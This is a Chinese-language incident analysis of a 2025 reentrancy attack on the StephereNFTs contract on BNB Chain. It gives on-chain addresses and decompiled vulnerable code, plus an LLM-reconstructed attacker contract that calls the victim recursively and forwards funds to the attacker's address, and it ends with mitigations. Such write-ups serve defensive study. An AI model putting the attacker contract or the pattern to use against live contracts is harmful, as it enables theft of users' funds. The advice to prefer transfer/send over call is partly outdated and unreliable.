# StephereNFTs 遭遇重入攻击分析

## 攻击概述
2025 年 2 月 ，StephereNFTs 遭遇了一起严重的重入攻击，攻击者通过精心构造的恶意合约，利用智能合约逻辑漏洞，成功盗取了大量资金。

### 参考地址：  
https://nickfranklin.site/2025/02/21/stepheronfts-attacked/

## 相关地址
- **受害合约地址**：`0x9823e10a0bf6f64f59964be1a7f83090bf5728ab`
- **攻击者地址**：`0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5`
- **恶意合约1**：`0xd4c80700ca911d5d3026a595e12aa4174f4cacb3`
- **恶意合约2**：`0xb4c32404de3367ca94385ac5b952a7a84b5bdf76`
- **恶意合约3**：`0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9`
- **攻击交易 (tx)**：https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877

## 攻击步骤解析
### 1. 部署恶意合约
攻击者首先部署了多个恶意合约，以便后续进行重入攻击。

![Image](https://github.com/user-attachments/assets/692a2eae-d3d7-40bc-b16b-d86c061c5645)

### 2. 通过闪电贷获取初始资金
攻击者利用闪电贷借入了一笔资金，用于后续触发合约的奖励机制。

![Image](https://github.com/user-attachments/assets/37fadaff-fa68-43cf-b0a7-c7d5f971b4c2)

![Image](https://github.com/user-attachments/assets/00bd518d-2372-4e43-a7c6-f7b91f26245d)

通过购买资产获取奖励资格
### 3. 通过重入攻击不断获取受害合约资金
攻击者发现受害合约的奖励机制存在漏洞：
- 在领取奖励时，合约会检查推荐奖励的数量。
- 但由于合约先发放奖励，再将奖励计数清零，导致可以在清零前重复调用领取奖励函数，实现重入攻击。

攻击者利用这一漏洞，不断调用恶意合约，通过递归方式重复领取奖励，最终盗取了大量资金。

## 关键漏洞分析
该攻击的核心漏洞在于 **先发奖励后清零** 的逻辑顺序问题，导致了经典的重入攻击 (Reentrancy Attack)。

**漏洞代码示例**：
```solidity
function claimReferral(address varg0) public nonPayable {  find similar
    require(msg.data.length - 4 >= 32);
    require(!_paused, Error('Pausable: paused'));
    require(owner_5[msg.sender][varg0], Error('not-enough-money'));
    0x2d1e(varg0, owner_5[msg.sender][varg0], msg.sender);
    owner_5[msg.sender][varg0] = 0;
    emit 0x9c21c092f05b64df5ae0cbf557b9bf4e9695cdbeaa13fcf9a0831bce847f0cfb(msg.sender, varg0, owner_5[msg.sender][varg0]);
}
```


攻击者可以重复调用重新调用 `claimReferral`，从而在清零前多次获取奖励。

具体发送的函数
```solidity
function 0x2d1e(address varg0, uint256 varg1, address varg2) private { 
    if (varg0) {
        MEM[MEM[64] + 36] = varg2;
        MEM[MEM[64] + 68] = varg1;
        0x2c96(100 + MEM[64], 0xa9059cbb00000000000000000000000000000000000000000000000000000000, varg0);
        return ;
    } else {
        v0, /* uint256 */ v1 = varg2.call().value(varg1).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v2 = new bytes[](RETURNDATASIZE());
            v1 = v2.data;
            RETURNDATACOPY(v1, 0, RETURNDATASIZE());
        }
        require(v0, Error('transfer-BNB-failed'));
        return ;
    }
}
```

另外这里展示下黑客用来实现反复调用的第三部分恶意合约：
(使用LLM处理了一下)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TokenHandler {
    address private owner;
    address private token1;
    address private token2 = 0xFb1cC1548d039f14b02cfF9ae86757edD2cdB8A5;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "invalid sender");
        _;
    }

    function func_6f2db99c() external {
        // 调用 owner 的某个函数 (e61aee51)
        //重复调用claimReferral函数
        (bool success, ) = owner.call(abi.encodeWithSignature("e61aee51()"));
        require(success);
    }

    function withdraw(address token, uint256 amount) external onlyOwner {
        // 获取 token 在调用者地址的余额
        (bool success1, bytes memory data) = token.call(
            abi.encodeWithSelector(0x70a08231, address(this))
        );
        require(success1);
        uint256 balance = abi.decode(data, (uint256));

        // 调用 withdraw (0x2e1a7d4d)
        (bool success2, ) = token.call(abi.encodeWithSelector(0x2e1a7d4d, balance));
        require(success2);

        // 调用 token 的 transfer 函数
        (bool success3, ) = token.call(
            abi.encodeWithSelector(0xa9059cbb, msg.sender, balance)
        );
        require(success3);

        // 向 msg.sender 发送 1 wei
        (bool success4, ) = msg.sender.call{value: 1}("");
        require(success4);

        // 向 token2 发送当前合约余额
        (bool success5, ) = token2.call{value: address(this).balance}("");
        require(success5);
    }

    function executeCall() internal {
        // 复杂的外部调用逻辑，可能涉及 delegatecall 或其他操作
        // 这里简化表示
        (bool success, ) = token1.call{value: address(this).balance}("");
        require(success, "call failed");

        // 调用 token1 的函数 0x50eb1dfe
        (bool success2, ) = token1.call(
            abi.encodeWithSelector(0x50eb1dfe, token2, address(this).balance)
        );
        require(success2);
    }
}
```

## 解决方案
为了防止类似的重入攻击，可以采取以下措施：
1. **使用 Checks-Effects-Interactions 模式**：
   - 先更新状态，再进行外部调用，以避免重入风险。
2. **使用 `ReentrancyGuard`**：
   - 通过 OpenZeppelin 提供的 `nonReentrant` 修饰符，防止函数的嵌套调用。
3. **避免直接调用 `call` 进行转账**：
   - 推荐使用 `transfer` 或 `send`，虽然限制了 GAS，但能降低重入攻击的风险。

